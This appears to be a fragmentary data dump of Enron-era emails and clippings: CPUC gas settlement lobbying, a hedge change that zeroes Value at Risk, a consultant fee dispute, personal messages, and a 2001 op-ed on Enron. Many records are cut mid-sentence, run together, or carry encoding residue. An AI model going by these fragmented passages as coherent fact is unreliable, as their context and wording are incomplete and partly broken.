CPUC president and one of the other five
      commissioners developed an alternative that gives ""conditional"" 
certification to the project so it can proceed with
      development and construction. To do so, Western Hub will have to comply 
with all the designated environmental
      mitigation measures, obtain adequate insurance and gain other state 
permits, including the State Lands
      Commission. 

      Western Hub officials have maintained that Lodi's unique geographical 
location with proximity to key electric
      generating plants will be the state's only underground storage project 
offering fast deliverability to meet the needs
      of an increasingly competitive generation market.

4348,"This communication is intended for signatories of the Comprehensive
Settlement Agreement, and is confidential under Rule 51 of the Commission's
Rules of Practice and Procedure.  Please do not forward this e-mail to other
parties.

During a meeting with Comm. Bilas today, he confirmed what we had been
previously advised, namely:  He did not communicate with any of his
colleagues regarding the PD, he is very disappointed at the limited scope of
the PD, and knows it does not go as far as it should; he would support an
alternate offered by another commission which adopted more or all of the
CSA.  He strongly urges parties to take their concerns about the PD to the
other commissioners.  He acknowledges it will be a tough sell.  However, he
does not have any communication from the Democratic commissioners on this
issue either way, so he cannot predict their reaction with any certainty.
The main reason for his issuance of the PD in this form appears to be that
he felt that a more aggressive PD issued by a Wilson appointee would attract
attacks simply because it was not offered by the new commissioner.

Additional data points:  Other key CPUC staff with access to President Lynch
that I spoke with today urged us to meet with her, and to emphasize that the
CSA does not result in a reduction in CPUC jurisdiction or regulatory
control (like AB 1890 did) and to take our best shot at convincing her and
Comm. Wood that customers, including core customers, may far much worse
under the interim than under the CSA (particularly in view of the interstate
capacity issues--as described by Mark Pocta of ORA on our recent conf.
call).  In addition, a fourth Commissioner (who will be around to vote next
year) suggested similar tactics and offered support for such an effort.

In light of this information, I suggest that we proceed to issue the letter
as planned, and ask that all parties, including SoCalGas, quickly review the
next draft to see if they can sign on.  We would like to have as many of the
CSA signatories as possible on the letter.  I hope to get the new draft out
today or early tomorrow.  Please respond by COB Thursday or early on Friday.

Next, I have asked for a meeting with Pres. Lynch.  I would like other
parties to attend as well (or schedule their own meetings).  As soon as I
get a date, I will advise.

Bottom line:  We urge parties to sign the letter and to file comments
supporting adoption of the CSA.  We need to meet with Lynch, and until and
unless we get a firm ""no"", we should not assume the settlement is dead.  We
should file comments on the PD on Monday which at least list our objections
to the PD and open the door for discussions on how to revive the CSA.

If possible, we will try to arrange a conference call on Friday.
Please call if you have any questions.

Per your request, I have outlined potential rebuttal testimony points for
your consideration. I recommend that we minimize our testimony to distinct
points without extensive elaboration whenever possible and/or coordinate our
ideas into Socal sponsored testimony.

Kern Rebuttal:

Transwestern desires to clarify Kern's request modification to the
Comprehensive Settlement into two parts. Kern is not correct in its
allegation that new or expanded interconnections have only secondary rights
in order to ""discourage new pipeline interconnections"" with Socal Gas. On
the contrary, the Settlement parties envisioned that future market
conditions may warrant such new supply interconnects and nothing in the
Comprehensive Settlement denies such interconnections from occurring.
Specifically, Transwestern and other parties simply did not want any such
new interconnects disrupting existing shippers primary firm rights. A
benefit during the entire settlement period is that holders of Socal
backbone capacity have stability and certainty for their backbone capacity
entitlements.

On the second part of Kern's request to modify the Comprehensive Settlement
by allowing new supply interconnections ""primary firm receipt capacity,
where such new interconnections do not degrade existing delivery capacity at
the existing Socal Gas receipt points."", the Comprehensive
Settlement does not prohibit such an outcome. The Settlement parties simply
envision that this matter and any other pertinent interconnection issues
would be negotiated between Socal and the new interconnection counter party
or would be determined in a separate Commission Application.

PG&E :

I think we need to play this problem as we have been, through private off
line discussions. If the Indicated Producer Group members can get
comfortable then we will find the right means to modify the Comprehensive
Agreement.


Post Interim Settlement (PIS) :

P8. The PIS correctly observes that there have been serious concerns with
respect to Socal Gas ""windowing"" procedures but incorrectly characterizes
the adoption of primary/secondary receipt point protocol outlined in the
Comprehensive Settlement as a ""resort to extreme measures"". Transwestern has
operated its own FERC pipeline system under such a protocol with great
success and customer satisfaction. The primary/secondary protocol is a
proven workable solution. The PIS receipt point protocol is an modified
""windowing"" procedure which does not offer a long term solution to receipt
point access on the Socal system.

P13. YAP The PIS proponents suggest ""it may be possible to put a system of
capacity rights into practice,"". Transwestern agrees that it is possible and
in fact the Comprehensive Settlement does in fact accomplish the possible.
While Transwestern agrees that customers are currently benefiting from
competitively priced gas at the interstate/intrastate Socal border, we see
no evidence that the unbundling of Socal's backbone system will reduce the
competitive environment
at the Socal border. In fact, the PIS consistently fails to recognize the
creation of an additional Socal competitive trading point, the Socal
citygate. All customers will have increase trading opportunities not less.

P14. The PIS proponents suggest that a ""bottleneck situation"" could occur at
the Socal citygate. Transwestern simply disagrees. The full 3500 mmfcd a day
of existing interstate capacity is available to supply the citygate market.
Most importantly, in addition to these supplies the entirety of Socal
storage withdrawal capacity (over 3 Bcf/d ) also trades at the Citygate
point on the Socal system. In view of potential new storage development in
Socal,this Citygate capacity could even increase. So rather than a
""bottleneck situation"" at the Citygate, Socal customers would reasonably
expect to enjoy even greater capacities than currently available at the
Socal border.

P14. The PIS proponents simply are incorrect that marketers could increase
prices by withholding
backbone capacity during alleged ""constrain periods"". SoCal and the parties
assured that Socal has the full opportunity to sell either operational
available firm capacity or interruptible capacity at anytime. If a firm
backbone capacity holder is not utilizing their full capacity entitlements ,
Socal can sell interruptible services.

P17. The problem identified by the PIS testimony where generators do not
receive confirmation of their electric bid award from the PX until after the
first gas nomination cycle is manageable under the Comprehensive Settlement
primary/secondary protocol. Firm primary receipt point capacity holders have
full use of their backbone capacity through the first 3 nomination cycles.
That is to say, generators can bid competitively into the PX market and be
absolutely certain that their Socal primary access and backbone transmission
service capacities will be available to them. These certainties do not exist
under the current or contemplated ""windowing"" procedure. The Comprehensive
Settlement offers a real long term improvement for generators.",Jeff & Susan Transwestern,,"Socal Kern Socal Gas the Comprehensive Settlement

4391,"Please Note:

We have changed the correlation of the Transwestern's hedges to the same 
index(El Paso Permian) that the derivatives were transacted.  We feel it is 
appropriate to make this correlation change due to management's anticipation 
to make the 2001 sales at an El Paso Permian index.  Due to this change TW 
has a perfect correlation, therefore the associated Value at Risk  will be 
zero.


",Transwestern,,El Paso TW
4392,"Team,

I reviewed the Socal PD . Here are a couple of rough thoughts for possible
TW comments in favor of the CSA and rejecting the PD's adoption of the IS.

1) The PD adoption of the IS modified windowing procedure falls
substantially short of the objectives outlined by the Commission order(s)
etc. The CSA's adoption of firm Socal receipt point rights is the only means
to give both Socal endusers and their suppliers the ""certainty"" they have
long sought. While, the IS as modified in the PD may appear to be an
improvement in the allocation of receipt points on the Socal system, it is
only an improvement upon a fundamentally flawed system. A system dependent
upon a ""daily"" determination of receipt point access volumes and completely
dependent upon upstream priority systems without consideration of Socal
customers needs. Indeed, this Commission is on record about adverse impacts
on California customers resulting from chaotic upstream transportation
rules.(need to be careful about wording)
The CSA gives incumbent Socal endusers preference to Socal's receipt points
under the open season rules, while the PD continues the status quo.   etc,
etc Ref. p.128 pt 10

2) If we lose the battle, lets try to reopen the deal sooner. p.132 pt.37
The PD calls for waiting a 2 year period before a Market Assessment would be
published. Based upon the MA the Commission could institute another OII. The
argument could be made that this waiting period is simply to long given the
speed at which the industry does move. Therefore, TW could recommend that
these Market Assessments be made annually or not at all if the CSA were
adopted etc.

These items maybe of no use , if the bigger picture and battle for the CSA
does not have Socal and other party support. Have a great day! Mark, IGS","p.132 pt.37

Guess you didn't have to make your trip.

Had thought that seeing Carmen in Houston even though it's being presented
here in May would be interesting, but think I'll pass on it.  I return Oct 18
and don't know if Karin wants me to spend the weekend with her and the Bug or
not since Jim will be gone.  But, I might come the end of Oct to do some
shopping.  Eric will be coming sometime the first 2 wks of Nov to use his
free ticket by the 15th.  We're going to get his reservation made when he
picks me up at the San Jose airport.  I'll be coming at some point for Ann
Kelly's birthday which is in Nov.  It's always difficult to find a date with
everyone's busy schedule--especially Ann's.  She never stops.

Went to the outlet this morning and bought some shoes but couldn't find
anything else.  That's always a lost cause for me and it will be a long time
before I go again.

Gorgeous day here, but it's warming up again.  So pleasant sleeping with the
bedroom door open to the porch.

acquiring capacity on El Paso in order to access the South Needles

I'm unsure how it would work.  TW does have a couple of interconnects with El 
Paso's system.  I would simply say in the memo that one solution to the 
constraint at Topock might be to get some shippers to switch to South 
Needles, and deliver gas to South Needles after twisting SoCal's arm and 
letting us in, or somehow acquiring capacity on El Paso (or otherwise using 
their system) to access South Needles.  Obviously we will need to flesh this 
out from an economic, regulatory and legal standpoint.  I will discuss it 
with Jeff when he returns.  My apologies for the delay.  Call if you have any

with Mr. Hertzberg.  He thanked us for all our cooperation but politely 
declined to give me any information on what authority he was relying on to 
conclude that there is a jurisdictional problem.  However, it sounded to me 
like whatever authority he does have is shaky at best.  He also sounded 
interested in the possibility of our making some sort of anonymous inquiry at 
FERC (if such a thing is possible) on the issue.  Obviously they are very 
leery of making that phone call themselves and risking revealing their 
identity.  He said he would discuss it with Ed Meaders.  Also, he mentioned 
that after tomorrow he will be on vacation for a month, and another attorney 
will be taking over in his absence.  That could be good, or it could be bad.

it balances out the unisex quality of the first name.  I think you really 
have to meet the baby before you decide for sure.  Who knows, she might turn 
out to be more of a Gladys!  heh, heh!

benefit of the doubt I figured the presentation must have taken longer than 
expected and afterward he'd decided to just go to Austin and pick up his 
friend from the airport.  If that were the case, knowing Ted, I thought he 
must have just forgotten that he'd told me he'd call.  WRONG!!!!  Friday at 
work I had to go down to his floor (for legitimate reasons I swear) and he 
was there, the jerk.  He didn't see me though nor did he try communicate with 
me at all that day.  

Flash forward to the next week.  I didn't get back to the office until 
Wednesday because I was in Austin Tuesday for a recruiting trip.  When I got 
in I of course immediately checked my email...nothing.  I also didn't have 
any messages at any of the 3 phones I can be reached through.  So it's now 
Thursday afternoon, still no interaction...I am pissed.  About 2:00 p.m. he 
calls.  He asks me about San Diego and I ask him about Austin...both trips 
were great.  We discuss UCLA and UT football for  a while...I of course get 
riled up.  He informs me that he is going to be trading corn (yes, you heard 
me corn) for Enron.  While he is very excited about trading I get the 
impression he feels a little overwhelmed and he is a very concerned about how 
much trading will limit his vacation time.  He said that he and Darren had 
been meeting with consultants all week to get up to speed and therefore the 
week had pretty much just been one long string of meetings.  It is around 
this point that he brings up the vacation thing and how, to his dismay, as a 
trader you work when the markets are open and you're only off when they're 
closed.  As a result, he's decided to get in his long visit home ASAP, i.e. 
""I'm leaving tomorrow (Friday) to go to California for a week.""  I make sure 
I heard him correctly and yes he said leaving, tomorrow and  1 whole week (7 
days) AND at no point did he ask to get together before he left.  So, that 
was Thursday.  I'm down on his floor again on Friday to talk to my old group 
and, to my dismay, run in to him.  We exchange pleasantries, I ask him when 
he's leaving, he informs me he is going to sleep for the entire week in an 
attempt to catch-up, I tell him to have fun and that's that.

So here we are, or rather here I am in Houston...alone.  Any thoughts?

On a brighter note, tell Katy I think I'm going to try and come Oct 4 - Oct 9 
so that I can see both of you.  Also, I understand your dilemma regarding 
Claudia, but I definitely don't think you should look a gift horse in the 
mouth (if you know what I mean).  That first month after Katy leaves is going 
to be awkward so it's best to have someone there even if only to act as a 
crutch until you find your footing.  I'm sure Monique can testify to a little 
extra weight dealing with me since you and Matt both took off.  And speaking 
of Matt, no I haven't heard a thing from the turn-coat.  I need to shoot him 
an email and see how things are shaping up for him.  I'm willing to bet 
though that moving to Austin hasn't solved all of his problems...just 
transplanted to a prettier location.

Get back to me with anything...I'm desperate for positive energy.  Oh, and 
I'm going to try to meet with that Director friend of mine this week to talk 
about swinging a rotation in London (he has 75 employees over there that work 
for him right now), and I'm going to set up a meeting with the lady in charge 
of my rotations within the analyst program to make sure I'm doing everything 
I can to get over there and still get promoted.

shipper the releasing shipper's discount at alt. points.  If we don't, and 
the replacement shipper uses an alt. point and has to pay max rate, releasing

4437,"Okay, so I'd really like to make a trip up there this weekend ( I haven't spent a weekend in Houston during April and can't imagine why I wouldn't just make the month a clean sweep).  Anyway, I know you're unbelievably busy right now and spending an entire weekend with me would not help you in the least...So, here's my suggestion:

I could either come up Friday night and we could do a late dinner (say 8:30-9:00 ) and then find someplace to hang out for a while or just rent a movie.  On Saturday we could get up, work out, grab something for brunch/lunch and maybe even go to Barton Springs (depending on the weather) and then I could take off and leave you the rest of Saturday and all of Sunday to work (we could even skip the Barton Springs piece).

The other option is to just shift everything a day forward...I'd come up on Saturday and leave Sunday.

Either give me a call or email me if either of these sound good to you.  I will also completely understand if you just really need to work/study this weekend.

4439,"Drew, I wanted you to be aware of a potential dispute with regard to our 
consultant, Mark Baldwin of IGS.  Our consulting agreement with IGS (which 
has now terminated) provided for a flat fee, plus an incentive fee calculated 
using the net present value of any contract ""identified by IGS"" and entered 
into during the term of the consulting agreement.  During the term of the 
agreement, TW entered into its Gallup Expansion agreement with Southern.  IGS 
is now claiming it brought in the deal and so is entitled to an incentive 
fee.  While it is undisputed that Mark discussed the deal with Southern, 
Southern was also on Lorraine's list of shippers to contact for Gallup 
Expansion capacity.  Also, the capacity was posted for all to see.  So, while 
Mark can certainly claim he ""identified"" the deal, he was not alone in doing 
so. 

Steve is going to call Mark in response to his letter (after he talks to 
Lorraine to verify facts).  Our thinking is that if we offer IGS some money 
they will be happy.  We would really like to preserve what has been a good 
working relationship with this consultant.   On the other hand, I think we 
could probably take the position that they are not entitled to any incentive 
fee.  However, since the contract is silent as to whether IGS has to be the 
only party bringing in the deal in order to qualify for the incentive fee, 
this position is not as strong as I'd like it to be, and IGS might sue TW.  
The amount in dispute could be as much as $200,000, depending on what rate we 
use in calculating net present value.

If you have any problem with our offering to pay part of the incentive fee to 
IGS, let me know.  I think it will be very important for Steve not to admit 
that Mark helped in any way in getting the deal -- just in case they do 
decide to take us to court.",Mark Baldwin Mark Lorraine Steve,"as much as $200,000",IGS TW Gallup Southern
4440,"Lindy -- I'm working on a checklist.
There were just a couple of issues arising from the discussions with market 
services, weren't there?
One having to do with whether we want to change our 68 A to reflect FTS-1 and 
FTS-3 in same bucket -- I'm leaning towards not changing since the language 
is already general enough to cover us there.
The other issue had to do with issuing the OFO if EFBH does not show up in 
the last cycle.  I do not believe any changes are necessary there either.  
The tariff language as it's currently written says we ""shall"" issue an OFO, 
and we would, but an OFO issued in the last cycle would simply be a formality 
and the EFBH shipper would have no choice but to pay the penalty.
If you see any roadblocks on these 2 tariff sheets (27A and 68A), or if there 
are any other issues we need to address, let me know.  Also, if you want to 
sit down and go thru my checklist together sometime tomorrow, or even later 
this afternoon, I'm available.

?	Added radio button - Cut Type Code. is vague, I think we need a button here.  Now we have a forced choice button of Hour-Ahead or Real-Time which works well.
?	Fixed  - Scheduled path quantity is vague, this should be Cut Volume.
?	By default it shows the original path now, New Path Text - If we make the New Path cut part of the Expanded view of the original path, then we could show Original Path, New path, and the user could copy  and make small changes to the new path instead of typing the whole thing in.
?	Follows Deal Entry Standards - The Counterparty list is just too confusing and cumbersome to be practical. It should mimic the deal entry list.
?	Fixed - The Annuity field currently does not recognize any number. It also should be able to function with NO number in it, as a typical resupply will not need an annuity. 	
?	Resupply Deal # - This also needs a choice. It will either be a New supply or a New Sink. This should need a deal number to proceed. Right now it does not like the deal number plus decimal.  I think to be consistent we need to require it everywhere a deal number is required
?	Fixed - Reason Text-this is not spelled correctly,  and the text box could be much smaller.  Most Reasons are probably a sentence at most.

one-minute trade time submission for both NYMEX and COMEX divisions.=20
Presently members falling below 80% timely submission per month are issued=

escalating warning letters and fines unless and until they clear out their=

Implementation of One-Minute Trade-Time Classes

The Board also accepted the recommendation of the Compliance Review Committ=

and Floor Committee to adopt a training program for members facing one-minu=

trade time fines on the NYMEX division.  The purpose of the program is to=

As incentive, any member attending the class will be allowed to =01&do over=

79%.  The member will still have to complete four violation free months=20

Audit Trail Classes

violations may:
 Attend an audit trail class, to be offered in June, July and August of 200=
1,=20
with future dates to be determined by the Floor Committee/Compliance Review=

Committee.  The class will be an intensive discussion of pit card problems=

will receive feedback from Floor and Compliance Review Committee Members, a=

the month will not count as a passing month.  A member who falls below 70%=

 The benefit to the member will be that the month that would have counted a=

a failing month will not count at all, as long as the member achieved at=20
least a 70% rate.  Members still need four problem free months to return to=

for 3 months would benefit by =01&doing over=018 a fourth (and possibly a f=

Incorporation of Spreads into One-Minute
Trade Time =01&Pit Card=018 Statistics for NYMEX Division

Present one-minute trade time =01&pit card=018 statistics do not include sp=

times.  During the most recent NYMEX Rule Enforcement Review--the CFTC audi=
t=20
of the Exchange=01,s Compliance programs and procedures--the CFTC recommend=
ed=20
that the NYMEX Division incorporate spread trades into the one-minute time=
=20
statistics.  The CFTC has made this recommendation in the past and the=20
Exchange has committed to respond to it. The COMEX Division one-minute trad=
e=20
time statistics already include spreads.

NYMEX Division Members should note that intra-commodity spread trades will =
be=20
incorporated into pit card one-minute trade time accuracy rates after a=20
=01&phase in=018 process of approximately 90 days.  In order to avoid subst=
andard=20
percentages once spreads are incorporated, members must make sure that thei=
r=20
spread prints are price reported in order to ensure that the Price Change=
=20
Register for spreads is accurate.  If a spread print is not reported, you=
=20
will not be credited with timely submission of pit cards, even if you throw=
=20
the trade into the pit in a timely manner.

Pit card statistics for outright trades are presently posted on the NYMEX=
=20
floor on a weekly basis.  Compliance Staff will continue to post statistics=
=20
for outright trades and will additionally post the statistics for spread=20
trades.  These spread trade statistics are for information only so that you=
=20
can assess your pit card submission rate in advance of incorporation of=20
spreads in the one-minute trade time submission percentages.  For informati=
on=20
purposes, the seller of the spread is considered to be the party who sells=
=20
the premium month.  In the case where the spread trades flat, the seller is=

The Enron entity executing the FX transaction as principal is ENA. 

However, note that for tax/legal the FX desk in London is run by Enron Europe 
Finance & Trading Limited (""EEFT"") as agent for ENA. Our position is that ENA 
does not have a place of business in London. Therefore all the transactions 
managed by the London FX desk are arranged by EEFT as agent for ENA.

Because of this there is a need to identify which FX desk arranged the 
transaction and a possible solution to this is to have separate logins and 
logoffs for each FX desk during their hours of responsibility. This would 
enable transaction reports to be run which identify those transactions which 
took place during the period for which each FX desk was responsible for 
managing the FX positions.

4478,"I am copying Sara on this b/c I would be interested in her input if she has a 
different take than I do.

I understand your message to mean that P&G is offering a representation from 
them that they will strictly adhere to their corporate derivatives policy 
(with a copy of the policy attached to the contract), and, in exchange for 
this, they would like the ""No Reliance"" representation deleted entirely.

I don't really see how such a representation helps us with the ""No Reliance"" 
problem.   The CFTC has ruled that in a dealer/customer context, if the 
customer relies on the dealer's expertise in entering into a trade, then the 
trade may be unenforceable against the customer.  The legal principle is one 
of fiduciary duty and doesn't really have anything to do with corporate 
authorization.  In other words, the fact that the trade is authorized does 
not change the fact that the customer is relying on the dealer's superior 
knowledge.

In its 1996 lawsuit with Bankers Trust, Procter & Gamble unwound an interest 
rate swap position when they ended up about $200 million out of the money.  
P&G argued that they were relying on BT due to BT's superior expertise in 
interest rate markets, and therefore P&G shouldn't have to pay.  The issue of 
whether or not P&G was authorized to enter into the swaps was not an issue at 
all in that case, nor would it be an issue, in my opinion, if P&G sought to 
unwind a pulp and paper swap with us based on our alleged superior expertise 
in pulp and paper markets.

The danger of having positions unwound has made the ""No Reliance"" clause one 
of the most important clauses in the ISDA for us.  I will look at and 
consider any particular language they may wish to propose, but conceptually, 
we can not trade with counterparties who wish to rely on our market expertise 
in deciding whether to enter into a trade. -- Bob

The KOMP Horticultural contract for the maintenance of leased floor plants has been cancelled.  Plant maintenance is not being performed on the leased plants in the Enron Building on floors 3 through 49.  Rather than removing the plants from the building, KOMP Horticultural has chosen to offer the plants to Enron employees for sale.  On January 16th from 11:00 AM to 2:00 PM, KOMP will have a table on the south side of the plaza, by the up escalator, for those employees interested in purchasing a plant. At the time of purchase, KOMP will give a special sticker to place on the container of the sold plant (do not bring plants to the plaza for purchase).  Plants will not be allowed to be removed from the building unless they have the KOMP sold sticker on the container.

The following guidelines must be followed:
?	Plants will be priced at $30 plus tax for floor plants; $10 plus tax for desk-top plants.
?	Only potted plants in black plastic containers are for sale.  Plants in chrome, bronze, clay or any other outside containers are not for sale. 
?	Employees must remove all plants from the building themselves.  Building Services cannot make pick-ups or deliveries.  
?	Security will be inspecting plants to assure they have the appropriate sticker when they are removed from the premises. 
?	Payment must be in cash or a personal check made out to KOMP Horticultural.

We sent them final execution copies in one day and Enron filed for bankruptcy 2 days later.  They never signed the docs and we never confirmed the transaction because we were waiting for the master.

With respect to Ocean Energy's comments on the Material Adverse Change 
definitions:

1.  I am OK with their addition of Moody's ratings (to my specified Standard 
& Poor's ratings).  Please note that the Moody's rating for Party A should be 
""Baa3"" and the Moody's rating for Party B should be ""Ba1"".

2.  Ocean has deleted the additional financial covenants that I wrote into 
the draft.  I will compromise with them and delete the Funded Debt/Net Worth 
requirement, but I want to keep the EBITDA Coverage Ratio requirement.


That appears to be all of the credit-related comments from Ocean.  Please let

4534,"The 2002 Enron Net Works budget will for the first time combine allocations to business units for four key services:  Enron Online, IT Infrastructure, Risk Management Operations and IT Maintenance and Development.  We are providing a level of detail for expense and capital spend that is greater than that provided in past years, and that will allow business units to make informed choices regarding the services that they receive.  

We are meeting with individual business unit Offices of the Chair to review in detail the four service areas delivered through Enron Net Works.  Some of these meetings have been completed and more will occur between now and October 12.  Please keep the following points in mind as we work with you to finalize budget:

Enron Networks today is very different from this time last year.  Additions to the 2002 ENW budget are Operations for EA, EIM and EGM.  Operations, IT Maintenance and Development, and IT Infrastructure for EES and EBS have been included under the ENW umbrella for the first time in the  2002  budget as well.  The 2001 budgets for these functions were approved and included in individual business units last year.   Any comparison of ENW's 2002 versus 2001 budget must be appropriately adjusted for these organizational changes to be relevant.  

For further detail for each business unit, ENW's 2002 expense and capital dollars are organized to mirror each business unit's lines of business (products or commodities) in order to create a transparent view at a more granular level of the costs involved in supporting each of the lines of business.  

The detail that is being provided to business units for IT costs delineates licensing fees, system maintenance costs and new development costs.  Detail on each IT development project identifies the purpose, business sponsor, line of business, ""in progress"" or ""planned"" designation, expense and capital spend, system impacted, and estimated completion date.   In order to finalize IT project budgets, decisions will be required from the business units on which projects to undertake in 2002.   

If you have questions about the ENW budgets as we are working with you to finalize them,  please call one of us.

4535,"With the recent movement in long term interest rates, I thought I would update you on Enron's exposure to Greenfield. Enron has a long term interest rate swap (which is in the money to Enron) in place with Greenfield, which has recently appreciated considerably. Preserving the value of this swap has become our top priority.

This is a quick summary of Enron's exposure to Greenfield.

Greenfield (In order of seniority):
Senior Debt			110mn
Additional Sponsor Loans	55mn (Not yet funded)
ECT Interest Rate Swap		16mn
Shareholder Loans		9mn
Equity				55mn
Total				245mn

Enron Exposure (In order of seniority):
Additional Sponsor Loans 	11mn (Not yet funded, no obligation to do so)
ECT Interest Rate Swap		16mn
Shareholder Loans		2.4mn
Equity				11mn
Total				29.4mn (Excluding Additional Sponsor Loan)

Current discussions center around a sale of the vessel to a third party. El Paso have recently submitted a letter indicating a potential bid of 210-215 million. If this sale were to be completed, Enron would recover the swap breakage of 16mn and the Shareholder loan of 2.4mn entirely, and would recover approximaetly $4 million of equity, resulting in an overall write off of approximately $7mn. The timing of this transaction is not yet certain, but our intention would be to delay until Q102. A sale to a third party at this level would represent the best possible solution for Enron, and our efforts are concentrated in this area

In discussions held last week with Jim Hughes, Jim indicated that he thought it was appropriate that his group should bear the loss associated with this transaction, as it was originally entered into because of Dabhol. The Global LNG group and the Finance group will continue to push as hard as possible to resolve this matter in the best interests of Enron, and we remain in constant liaison with the DPC group.

Please feel free to contact us if you have any further questions.

It is coal which will be shipped to service European commitments and represents the cheapest way to do so taking all costs into account (including financing). Needless to say if we pull out of this deal at this stage it will have huge ramifications with our customer and send all the wrong signals to our counterparties in this part of the world.

PERSPECTIVES
A tale of greed and hubris
Waldo Proffitt

11/18/2001
Sarasota Herald-Tribune
All
F2
(Copyright 2001)

For anyone not already disenchanted with the idea of total deregulation of public utilities, the most recent installment of the miserable Enron story as it unfolded last week should serve as a convincing example of the folly of relying on unregulated profit- driven enterprises to supply our energy. 
A year ago Enron was the darling of Wall Street, the poster boy for the utility industry, its stock selling for about $85 a share. Last week its stock was worth about 10 percent of that and the company had agreed to be bought by a competitor. There was fear the company's bond rating might fall to the ""junk"" level.
What happened? It will take months, if not years, to untangle the details, but it is clear that the main culprit was greed, closely followed by hubris. 
Not too many years ago Enron was a small, struggling, gas pipeline company in Houston. As deregulation spread to more and more states, Enron began acquiring pipelines, gas producers and utilities. 
It also acquired friends in high places, especially the Bush family and their key political advisers. And, it discovered it could make money faster by selling and trading energy than by producing it. Enron sold many of its generating plants and became the biggest ""power broker"" in the nation. 
Though it was by no means the largest winner in the con game that bilked California consumers of tens of billions of dollars, Enron was one of the first power barons to take advantage of California's flawed deregulation law -- virtually written by in-state and out-of- state utility companies. 
The California fiasco soured (probably) most Americans on utility deregulation, but Enron was not singled out for calumny, and management saw no reason to examine its business ethics. 
Contrarywise. management had visions of even greater profits, which it felt no obligation to share with ordinary stockholders. The chief financial officer and other high-ranking executives set up affiliated or subsidiary partnerships which made deals with Enron. I do not understand the details of these arrangements, but neither do independent accountants, the Securities and Exchange Commission or congressional investigators. It does seem clear that the Enron insiders made millions for themselves. 
Enron acknowledges, without explaining, that stockholder equity dropped $1.2 billion in the last quarter and that it had for the last five years overstated profits by some $600 million. Whether this was by design or by mistake is in dispute, but it is the sort of thing which tends to undermine the confidence of investors. 
So much for greed. Back to hubris. It seems not unlikely that Enron's leaders felt they might not be punished for a modest amount of corner-cutting because they had friends in high places. 
The chief executive, Kenneth L. Lay, was and is a personal friend of George W. Bush and has easy access to the White House. For many months after the new administration took office, Karl Rove, Bush's top political strategist, owned Enron stock valued at $100,000 to $250,000, and sold it only after he had been able to secure a ruling that he did not have to pay capital gains tax immediately because he sold to avoid a conflict of interest. Lawrence Lindsey, the president's chief economic coordinator, and I. Lewis Libby, Vice President Cheney's chief of staff, owned stock in Enron, and Lindsey was paid $50,000 last year as a consultant for Enron. 
Enron and its employees gave more than anyone else to Bush's four political campaigns -- one (unsuccessful) for Congress, two for governor and one for president. In 2000, Enron and its employees gave $113,000 to Bush's campaign, $250,000 to the Republican National Committee, and $300,000 to the Presidential Inauguration Committee. 
Cabinet appointments affecting energy policy, key sub-Cabinet appointments, administration action or inaction in the California energy mess, and the overall energy policy of the administration could hardly have been more favorable to the interests of Enron. 
And now a couple of questions: Is it possible the unusual financial maneuvers by Enron went unnoticed or even unsuspected by all the savvy Texas oilmen in the Bush administration? Were those of them with heavy investments in Enron unconcerned about the conduct of the company? Was Enron right in thinking its friends in government would not be in a hurry to investigate or to reprimand? 
Or, in light of our preoccupation with terrorism, will the Enron case get much attention from the federal government? Or from voters?

Dear Equity,

Good morning,

I hope you were out shopping this weekend; the sales even got me out.  

We will have a special installment of out Retail Survey this afternoon to
see how this weekend went.  Hopefully the relative strength reported by
TeleCheck will be confirmed.  

The feeling here is Holiday sales and 4Q GDP will surprise, and be strong
versus expectations.  We raised our estimate for 4Q GDP from -2% to -1%.
The next two week's data should determine whether or not we are correct.

The weekly report builds on the ""over but not finished"" theme we debuted
last week.  The evidence we've had over the last 7 weeks suggests the
recession is ending.  We expect this quarter and next to surprise versus
the consensus, but then in 2H02, the relative strength should peter-out.
The first 7 pages cover this theme and page 6 has the table we love to put
out comparing 4Q retail sales and the Wilshire.

Ed and Nancy spent more time on the previous ""hiccups"" in bond yields and
what their causes were.  The only thing they could come up with were
rallies in the stock market.  Our estimate for the 10 yr has also been
changed - we now have yields rising to 5.5% in 2Q and falling to 5.3% in 3Q. 

If there is any political risk to the market, it is that it gets jitters
about the stimulus package.  Tom Gallagher reports both parties are acting
surprisingly partisan, but he still bets there is a 2/3 chance the bill
gets done.  Andy Laperriere reports on the Hill - the terrorism insurance
bill should get done in the House this week, benefiting AIG, ALL, CB, and
BRK.  Andy also has a useful table of which AIRLINE is getting how much of
the first half of the bailout.  

Finally, Jim is looking at this market in an ""absolute vs. relative"" manor.
 Yes, valuations are high.  But there is a lot of liquidity out there (also
highlighted in the EMM) and there is evidence of it ""trickling down"" into
the high yield and junk markets.  This liquidity makes Jim comfortable with
the idea of the market being able to go a little bit higher in the short
term.  

Have a great day.

From:		Patrick T. Harker



The attacks on New York and Washington have stunned the world.  The magnitude
of the devastation and sheer barbarism of these acts utterly defy explanation.
Our community has been deeply affected by this tragedy.  In the coming days and
weeks, we will begin to learn just how many alumni, family members, colleagues
and associates have been personally touched -- and as a community, we mourn
their loss.

We are in the process of setting up means by which our alumni can share
information relevant to the whereabouts of themselves, their classmates, families
and friends, as well as links to other sites where information may be available.
Information will be available on the School's website at
http://www.wharton.upenn.edu.  Additional information regarding the University of
Pennsylvania's efforts for students, alumni, families, faculty and staff is available
at http://www.upenn.edu/emergencyinfosite.

These are times that challenge us all to reckon with the impact that such
unfathomable events have in our ability to move forward.  As an institution --
and as a worldwide community -- Wharton faces this task as well.

The Wharton School, from its founding and throughout its 120-year history, has
had a singular educational mission:  to create leaders.  Generations of men and
women from all over the world have come to the Wharton School to prepare for
leadership in the global society.  Wharton alumni are leaders of vision, of passion
and of the highest moral character.  An essential quality of their service to the
world is their deep respect for views of others and their commitment to unity and
cooperation.  Their contributions to the economic and social advancement of
humankind have consistently built a better future for the generations that follow.

What is clear and certain in the wake of these attacks is that the mission of this
institution is more important than ever.  We cannot falter in our ultimate purpose.
We must continue to offer today's - and tomorrow's - students the opportunities to
grow into leaders and to take on the mantle of global responsibility that is the
hallmark of all of our alumni throughout the world.

While we rededicate ourselves to our global mission of service and leadership, we
must also serve each other in this difficult time.  Above all, this is a tragedy of
personal, human impact.  We must console each other in our grief and join
together in a spirit of healing.  My thoughts and prayers are with you and our
entire Wharton community around the world.

4652,"Some things to consider --

A. Enron Response to Alliance Compliance Filing (pre-MISO/ARTO discussions)

1. Stakeholder Process
 a. Getting better, more meetings post EPSA letter
2. Day One Congestion Management (not much to discuss, already approved by 
FERC)
3. Key Issue - Many details left uncertain until ARTO filing 120 days prior 
to 12/15/01

RECOMMENDATION - Don't file right now.  Talk with FERC staff about our Wish 
List for RTOs. Work through RTO process to implement.

B. National Grid Operation of ARTO (Comments June 14/01)

